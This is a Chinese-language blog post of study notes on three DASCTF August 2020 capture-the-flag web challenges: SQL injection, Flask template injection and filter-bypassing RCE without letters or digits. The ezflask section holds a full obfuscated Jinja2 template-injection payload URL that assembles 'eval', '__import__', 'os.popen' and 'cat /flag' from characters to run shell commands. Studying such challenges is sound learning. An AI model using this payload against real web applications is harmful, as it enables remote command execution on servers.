---
title: DASCTF八月赛学习
author: Troy3e
avatar: 'https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/avatar.jpg'
authorAbout: steamID：888007034
authorDesc: 'Blizzard：TroyeSivan#51769'
categories: 技术
comments: true
date: 2020-09-07 12:14:07
authorLink:
tags:
keywords:
description:
photos: https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/987544.jpg
---

一、安恒大学
这道题当时没做出来，看了wp才知道是实战改编的，主要是没想到会在邮箱那里存在sql注入，一直在研究那个留言板，以为是ssti或者二次注入，wtcl。

二、ezflask

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/4155.jpg)

y1ng师傅的payload，保存一下，构造任意字符串说不定以后会遇到。

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/626546.jpg)

    payload：
    http://183.129.189.60:10025/?name=?{%%20set%20xhx%20=%20(({%20}|select()|string()|list()).pop(24)|string())%}{%%20set%20spa%20=%20((app.__doc__|list()).pop(102)|string())%}{%%20set%20pt%20=%20((app.__doc__|list()).pop(320)|string())%}%20{%%20set%20yin%20=%20((app.__doc__|list()).pop(337)|string())%}{%%20set%20left%20=%20((app.__doc__|list()).pop(264)|string())%}%20{%%20set%20right%20=%20((app.__doc__|list()).pop(286)|string())%}%20{%%20set%20slas%20=%20(y1ng.__init__.__globals__.__repr__()|list()).pop(349)%}%20{%%20set%20bu%20=%20dict(buil=aa,tins=dd)|join()%20%}{%%20set%20im%20=%20dict(imp=aa,ort=dd)|join()%20%}{%%20set%20sy%20=%20dict(po=aa,pen=dd)|join()%20%}{%%20set%20os%20=%20dict(o=aa,s=dd)|join()%20%}%20{%%20set%20ca%20=%20dict(ca=aa,t=dd)|join()%20%}{%%20set%20flg%20=%20dict(fl=aa,ag=dd)|join()%20%}{%%20set%20ev%20=%20dict(ev=aa,al=dd)|join()%20%}%20{%%20set%20red%20=%20dict(re=aa,ad=dd)|join()%}{%%20set%20bul%20=%20xhx*2~bu~xhx*2%20%}{%%20set%20pld%20=%20xhx*2~im~xhx*2~left~yin~os~yin~right~pt~sy~left~yin~ca~spa~slas~flg~yin~right~pt~red~left~right%20%}%20{%%20for%20f,v%20in%20y1ng.__init__.__globals__.items()%20%}{%%20if%20f%20==%20bul%20%}{%%20for%20a,b%20in%20v.items()%20%}{%%20if%20a%20==%20ev%20%}{{b(pld)}}{%%20endif%20%}{%%20endfor%20%}{%%20endif%20%}{%%20endfor%20%}

三、rceme

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/6537835.jpg)

无字母数字rce
虽然过滤了部分位运算符 但还是漏了一个| 或运算
利用或运算符构造playload 调用readfile函数 读取根目录flag

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/97585.jpg)

这里就用反引号的二进制位与payload的二进制位对比，得出最后的payload：
异或构造字符。
